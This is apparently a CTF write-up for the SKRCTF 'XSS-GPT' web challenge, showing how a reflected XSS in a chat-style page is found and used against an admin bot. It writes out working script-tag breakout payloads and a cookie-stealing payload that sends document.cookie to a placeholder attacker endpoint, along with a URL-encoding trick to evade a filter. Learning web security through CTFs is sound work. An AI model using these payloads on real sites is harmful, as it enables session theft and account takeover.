---
layout: post
title: "SKRCTF: XSS-GPT"
date: 2023-10-01
categories:
  - CTF WriteUp
---

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/xss-gpt-instruction.png){:.align-center}

This is a Web category challenge. From the name of this challenge, we know that this challenge involves exploiting a Cross-Site Scripting (XSS) vulnerability. The instructions said "*I built a chatgpt website*" and "*report to me if you found any bug*". This means that he is the administrator of the website, and if we found an  XSS vulnerability in the website, we need to report it to him. The website :

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/xss-gpt-webpage.png){:.align-center}

The webpage looks like it's a chat application, which looks a little similar to ChatGPT. Testing this chat application :

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/xss-gpt-test-webpage.png){:.align-center}

It looks like the website asks for an API key before the user can use this web-based chat application. If we look at the HTML code of this website, we found that we don't need a real OpenAI API key because this website uses a placeholder value `("Bearer None")` for the API key, which is not a valid API key. Try to use `test123` for the API key :

- `http://skrctf.me:4000/?apiKey=test123`

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/xss-gpt-api-key-failed.png){:.align-center}

The first hint indicates that we should manipulate the URL parameter :

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/xss-gpt-hint1.png){:.align-center}

This challenge is named "XSS-GPT", so we can focus on finding the XSS vulnerability on this website. Testing a basic XSS attack :

- `<script>alert("basic-xss")</script>`

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/xss-gpt-test-basic-xss-result.png){:.align-center}

We get an error-like message. However, it's not an error. HTML code :

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/xss-gpt-test-basic-xss-html.png){:.align-center}

At line 11, the  opening `<script>` tag was used. The tag was then closed by our basic XSS script (`</script>`). Everything after the closing tag will become the content of the website. So we need to add the closing tag (`</script>`) before our XSS script :

- `</script><script>alert("basic-xss")</script>`

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/xss-gpt-test-basic-xss-success.png){:.align-center}

We successfully triggered a Reflected XSS. This means that we have found a Reflected XSS vulnerability. So we need to report to the admin of the website. There is a button named "*Report Admin*" at the bottom right :

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/xss-gpt-report-admin-button.png){:.align-center}

We need to know what this button does (in the HTML code) :

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/xss-gpt-report-admin-button-source.png){:.align-center}

It looks like the button executes `reportAdmin()` function. So we need to know what this function does. In the HTML code, before the HTML Style :

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/xss-gpt-report-admin-function.png){:.align-center}

In `reportAdmin()` function :

1) **API Key Extraction** : The function extracts the API key from the URL using `const queryParams = URLSearchParams(window.location.search);` and `const apiKey = queryParams.get("apiKey")`.
2) **XHR Request** : It creates an XMLHttpRequest object (`xhttp`) to send a POST request to the "`reportAdmin`" endpoint.
3) **Request Data** : It sends the API key as a parameter in the request body using `xhttp.send("key="+encodeURIComponent(apiKey));`.
4) **Response Handling** : The function listens for the response and displays an alert message with "*Reported to admin!*" if the response status is 200.

The second hint indicates that we need to steal admin's cookie :

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/xss-gpt-hint2.png){:.align-center}

Under the second hint, we were given a JavaScript file, "*bot.js*" :

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/xss-gpt-bot-js.png){:.align-center}

The provided JavaScript file appears to be a PhantomJS script. PhantomJS is a **headless web browser scriptable with JavaScript**, often used for automation tasks. So this "*bot.js*" is a piece of PhantomJS script behind the website that acts as "*admin*" (the admin is a bot). The script uses `phantom.adCookie` to set a cookie named '*flag*' with a value of '*this_is_not_the_flag*'. This information indicates that the value of admin's cookie is our flag. So we need to steal the admin's cookie.

We can ease our task with Burp Suite. Intercepting a request :

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/xss-gpt-report-admin-foxy.png){:.align-center}

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/xss-gpt-report-admin-intercept.png){:.align-center}

Right-click on Burp Suite > Send to Repeater. Go to the Repeater tab. Now we can modify the request body with our XSS script. First, we need to test if our server endpoint receives a GET request from admin. We can use [Webhook.site](https://webhook.site/) as our server endpoint to monitor any request  :

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/xss-gpt-webhook.png){:.align-center}

Use the unique URL provided in [Webhook.site](https://webhook.site/) as our server endpoint :

- `</script><script>var i=new Image;i.src="http://our-server-endpoint";</script>`
- [Steal Cookie with Reflected XXS](https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md)

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/xss-gpt-report-admin-xss.png){:.align-center}

As we can see, our server endpoint received a GET request from admin :

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/xss-gpt-report-admin-xss-triggered.png){:.align-center}

Now, we can add `+document.cookie;` in our XSS script. However, after we inject our XSS script with `+document.cookie;` and get the "*Reported to admin!*" message (which indicates that the injection was successful), our server endpoint no longer receives a GET request from admin. This indicates that there is some kind of input filtering that filters `+document.cookie;`. We can use basic encoding, such as URL encoding. On Burp Suite, highlight `+document.cookie;`, right-click > Convert selection > URL > URL-encode key characters.

- `</script><script>var i=new Image;i.src="http://our-server-endpoint/?"+document.cookie;</script>`

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/xss-gpt-report-admin-xss-steal-cookie.png){:.align-center}

![](https://raw.githubusercontent.com/faridarif/faridarif.github.io/master/pictures/xss-gpt-report-admin-xss-steal-cookie-success.png){:.align-center}

We successfully steal the admin's cookie!
## Walkthrough

https://drive.google.com/file/d/1-zrxlZRYWRVV7-kFzA0mA6ENO9XpE6HR/view?usp=drivesdk
